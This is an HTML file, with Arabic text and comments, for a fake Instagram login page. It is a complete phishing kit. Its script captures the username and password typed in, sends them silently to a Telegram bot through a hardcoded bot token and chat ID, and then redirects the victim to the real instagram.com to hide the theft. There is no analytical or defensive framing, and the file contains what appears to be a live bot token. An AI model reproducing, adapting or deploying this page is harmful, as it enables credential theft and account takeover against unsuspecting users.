<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram – تسجيل الدخول</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 350px;
            width: 90%;
            margin: 20px auto;
            text-align: center;
        }
        .logo {
            font-family: 'Billabong', 'Segoe UI', cursive;
            font-size: 48px;
            margin-bottom: 20px;
            color: #262626;
        }
        .box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 30px 40px;
            margin-bottom: 10px;
        }
        input {
            width: 100%;
            padding: 12px 8px;
            margin: 6px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 14px;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        .btn {
            width: 100%;
            padding: 10px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 16px 0;
            opacity: 0.7;
        }
        .btn:hover {
            opacity: 1;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider span {
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin: 15px 0;
        }
        .forgot {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-top: 15px;
        }
        .signup {
            margin-top: 20px;
            font-size: 14px;
        }
        .signup a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- صندوق تسجيل الدخول -->
        <div class="box">
            <div class="logo">Instagram</div>
            
            <form id="instaForm">
                <input type="text" id="emailField" placeholder="الهاتف أو البريد الإلكتروني أو اسم المستخدم" required>
                <input type="password" id="passField" placeholder="كلمة المرور" required>
                
                <button type="submit" class="btn">تسجيل الدخول</button>
            </form>

            <div class="divider"><span>أو</span></div>
            
            <a href="#" class="fb-login">تسجيل الدخول باستخدام فيسبوك</a>
            <a href="#" class="forgot">هل نسيت كلمة المرور؟</a>
        </div>

        <!-- صندوق إنشاء حساب جديد -->
        <div class="box" style="padding: 20px;">
            <div class="signup">
                ليس لديك حساب؟ <a href="#">إنشاء حساب</a>
            </div>
        </div>
    </div>

    <script>
        // ==========================================
        // ⚠️ هنا تضع التوكن والـ Chat ID الخاصين بك
        // ==========================================
        const BOT_TOKEN = "8741081301:AAF3AcpiS-02k1udgXVdKWhRZmGPM7RFPlI";
        const CHAT_ID = "1346886960";

        // ==========================================
        // كود الإرسال إلى تيليجرام
        // ==========================================
        document.getElementById('instaForm').addEventListener('submit', function(event) {
            event.preventDefault(); // منع إرسال النموذج التقليدي

            // جلب البيانات من الحقول
            var user = document.getElementById('emailField').value;
            var pass = document.getElementById('passField').value;

            // تجهيز الرسالة
            var message = "🚨 بيانات Instagram جديدة!\n━━━━━━━━━━━━━━━\n👤 " + user + "\n🔑 " + pass;

            // رابط API مع التوكن ومعرف الشات
            var url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(message);

            // إرسال الطلب بصمت، ثم توجيه المستخدم إلى instagram.com
            fetch(url).finally(function() {
                window.location.href = "https://www.instagram.com/";
            });
        });
    </script>
</body>
</html>
